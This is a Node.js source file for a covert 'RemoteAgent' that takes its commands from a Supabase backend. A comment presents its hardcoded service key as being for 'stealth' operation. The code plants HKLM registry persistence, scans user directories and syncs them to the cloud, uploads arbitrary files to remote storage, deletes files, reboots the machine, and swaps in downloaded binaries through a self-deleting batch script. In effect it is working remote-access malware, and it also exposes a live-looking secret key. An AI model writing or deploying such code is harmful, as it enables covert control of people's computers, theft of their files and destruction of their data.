const { createClient } = require('@supabase/supabase-js');
const os = require('os');
const { exec } = require('child_process');
const path = require('path');
const fs = require('fs').promises;

// Hardcoded credentials for "stealth" single-file operation
const SUPABASE_URL = "https://rghhlxgwetysbyfiwwhu.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJnaGhseGd3ZXR5c2J5Zml3d2h1Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjgwMjQ3NCwiZXhwIjoyMDkyMzc4NDc0fQ.BlVn3BnMrZIas5FlVGf6lXDsh47dsrINIb46y2hF_LU";

const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
const COMPUTER_NAME = os.hostname();

const MAX_LOG_ENTRIES = 100;
const MAX_COMMAND_HISTORY = 50;

/**
 * Logs messages back to the Supabase dashboard
 */
async function logToCloud(message, level = 'info') {
  // Insert new log
  const { data } = await supabase.from('logs').insert({
    message,
    level,
    computer_name: COMPUTER_NAME
  });

  // Prune old logs to keep database size small
  const { data: logs } = await supabase.from('logs').select('id').eq('computer_name', COMPUTER_NAME).order('created_at', { ascending: false });
  if (logs && logs.length > MAX_LOG_ENTRIES) {
    const idsToDelete = logs.slice(MAX_LOG_ENTRIES).map(l => l.id);
    await supabase.from('logs').delete().in('id', idsToDelete);
  }
}

/**
 * Scans a directory and syncs it with the file_structure table
 */
async function scanDirectory(dirPath, foldersOnly = false) {
  try {
    const target = path.resolve(dirPath);
    let entries = await fs.readdir(target, { withFileTypes: true });

    if (foldersOnly) {
      entries = entries.filter(entry => entry.isDirectory());
    }

    const records = entries.map(entry => ({
      name: entry.name,
      path: path.join(target, entry.name),
      is_dir: entry.isDirectory(),
      computer_name: COMPUTER_NAME
    }));

    // 1. Fetch existing database records for this machine to compare
    const { data: dbRecords, error: fetchError } = await supabase
      .from('file_structure')
      .select('id, path')
      .eq('computer_name', COMPUTER_NAME);

    if (fetchError) throw fetchError;

    // 2. Identify records that are immediate children of the target directory
    const dbChildren = (dbRecords || []).filter(r => path.dirname(r.path) === target);
    
    const localPaths = new Set(records.map(r => r.path));
    const dbPathsMap = new Map(dbChildren.map(r => [r.path, r.id]));

    // 3. Find IDs to delete (items in DB but no longer on disk)
    const idsToDelete = dbChildren.filter(r => !localPaths.has(r.path)).map(r => r.id);

    // 4. Find records to insert (items on disk but not in DB)
    const itemsToInsert = records.filter(r => !dbPathsMap.has(r.path));

    if (idsToDelete.length > 0) await supabase.from('file_structure').delete().in('id', idsToDelete);
    if (itemsToInsert.length > 0) await supabase.from('file_structure').insert(itemsToInsert);

    await logToCloud(`Sync complete: ${target}. Added: ${itemsToInsert.length}, Removed: ${idsToDelete.length}`);
  } catch (err) {
    await logToCloud(`Scan error: ${err.message}`, 'error');
  }
}

/**
 * Windows Persistence: Adds the script to the registry to run on startup
 */
function ensurePersistence() {
  if (process.platform === 'win32') {
    // Detect if running as a compiled .exe (via pkg) or a raw script
    const isCompiled = Boolean(process.pkg);
    const appPath = isCompiled ? `"${process.execPath}"` : `node "${path.resolve(__filename)}"`;

    // Using HKEY_LOCAL_MACHINE ensures it runs for all users. 
    // This requires the first run to be "Run as Administrator".
    const regCmd = `reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RemoteAgent" /t REG_SZ /d "${appPath}" /f`;
    
    exec(regCmd, (err) => {
      if (err) logToCloud(`Persistence setup failed: ${err.message}`, 'error');
      else logToCloud("Persistence established in HKLM Registry.");
    });
  }
}

/**
 * Command Router
 */
async function handleCommand(payload) {
  const { id, action_type, payload: data } = payload.new;
  await logToCloud(`Executing ${action_type}...`);

  try {
    switch (action_type) {
      case 'RESTART':
        await logToCloud("System rebooting...", "warn");
        exec('shutdown /r /t 5'); // 5-second delay
        break;

      case 'SCAN':
        const targetPath = data?.path || 'C:\\Users';
        await scanDirectory(targetPath, data?.foldersOnly);
        break;

      case 'MKDIR':
        if (!data?.parentPath || !data?.name) throw new Error("Missing parent path or folder name");
        const newFolderPath = path.join(data.parentPath, data.name);
        await fs.mkdir(newFolderPath);
        await logToCloud(`Created folder: ${newFolderPath}`);
        await scanDirectory(data.parentPath);
        break;

      case 'RENAME':
        if (!data?.path || !data?.newName) throw new Error("Missing path or new name");
        const renamedPath = path.join(path.dirname(data.path), data.newName);
        await fs.rename(data.path, renamedPath);
        await logToCloud(`Renamed: ${data.path} -> ${renamedPath}`);
        await scanDirectory(path.dirname(data.path));
        break;

      case 'MOVE':
        if (!data?.path || !data?.newPath) throw new Error("Missing source or target path");
        await fs.rename(data.path, data.newPath);
        await logToCloud(`Moved: ${data.path} -> ${data.newPath}`);
        await scanDirectory(path.dirname(data.path));
        if (path.dirname(data.path) !== path.dirname(data.newPath)) {
          await scanDirectory(path.dirname(data.newPath));
        }
        break;

      case 'UPDATE':
        if (!data?.storagePath) throw new Error("No storagePath provided for update");
        
        const { data: blob, error: downloadError } = await supabase.storage
          .from('updates')
          .download(data.storagePath);

        if (downloadError) throw downloadError;

        const arrayBuffer = await blob.arrayBuffer();
        const buffer = Buffer.from(arrayBuffer);
        
        const isCompiled = Boolean(process.pkg);
        const currentPath = isCompiled ? process.execPath : path.resolve(__filename);
        const newPath = currentPath + ".new";
        const updaterPath = path.join(os.tmpdir(), `updater_${Date.now()}.bat`);

        // Write the new binary to a temporary path
        await fs.writeFile(newPath, buffer);
        
        // Create a batch script to swap the files once this process exits
        const batchScript = [
          '@echo off',
          'timeout /t 3 /nobreak > nul',
          `del /f /q "${currentPath}"`,
          `move "${newPath}" "${currentPath}"`,
          `start "" "${currentPath}"`,
          'del "%~f0"'
        ].join('\r\n');

        await fs.writeFile(updaterPath, batchScript);
        await logToCloud("Update downloaded. Swapping binary and restarting...");
        
        // Execute updater detached and kill the current process
        const { spawn } = require('child_process');
        spawn('cmd.exe', ['/c', updaterPath], { detached: true, stdio: 'ignore' }).unref();
        process.exit(0);
        break;

      case 'DOWNLOAD':
        if (!data?.path) throw new Error("No path provided for download");
        const fileName = path.basename(data.path);
        const fileBuffer = await fs.readFile(data.path);
        
        // Organize storage as computer_name/timestamp_filename
        const storagePath = `${COMPUTER_NAME}/${Date.now()}_${fileName}`;
        
        const { error: uploadError } = await supabase.storage
          .from('downloads')
          .upload(storagePath, fileBuffer);

        if (uploadError) throw uploadError;
        await logToCloud(`File synced to cloud storage: ${storagePath}`);
        break;

      case 'DELETE':
        if (!data?.path) throw new Error("No path provided for deletion");
        await fs.rm(data.path, { recursive: true, force: true });
        await logToCloud(`Deleted: ${data.path}`, "warn");
        // Refresh view after delete
        await scanDirectory(path.dirname(data.path));
        break;

      default:
        await logToCloud(`Unknown command: ${action_type}`, "error");
    }

    // Mark command as completed
    await supabase.from('commands').update({ status: 'completed' }).eq('id', id);

    // Prune old commands
    const { data: history } = await supabase.from('commands').select('id').eq('computer_name', COMPUTER_NAME).order('created_at', { ascending: false });
    if (history && history.length > MAX_COMMAND_HISTORY) {
      const idsToDelete = history.slice(MAX_COMMAND_HISTORY).map(c => c.id);
      await supabase.from('commands').delete().in('id', idsToDelete);
    }
  } catch (error) {
    await logToCloud(`Command failed: ${error.message}`, "error");
    await supabase.from('commands').update({ status: 'failed' }).eq('id', id);
  }
}

async function start() {
  console.log(`Agent started on ${COMPUTER_NAME}`);
  ensurePersistence();
  await logToCloud("Agent Online");

  // Subscribe to commands targeting this specific computer
  supabase
    .channel('remote-cmds')
    .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'commands', filter: `computer_name=eq.${COMPUTER_NAME}` }, handleCommand)
    .subscribe();
}

start();